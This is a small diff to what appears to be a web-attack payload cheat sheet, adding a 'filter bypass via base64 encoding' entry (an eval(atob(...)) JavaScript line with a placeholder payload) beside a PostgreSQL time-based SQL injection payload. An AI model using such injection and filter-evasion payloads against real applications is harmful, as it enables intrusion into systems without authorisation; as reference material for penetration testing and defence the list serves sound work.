@@ -389,6 +389,11 @@ Time based (Postgre):
 ' OR pg_sleep(5) -- -
 ```
 
+##### Filter bypass via base64 encoding
+
+```js
+eval(atob(BASE64_ENCODED_PAYLOAD))
+```
 
 ##### Filter bypass via XML encoding
 
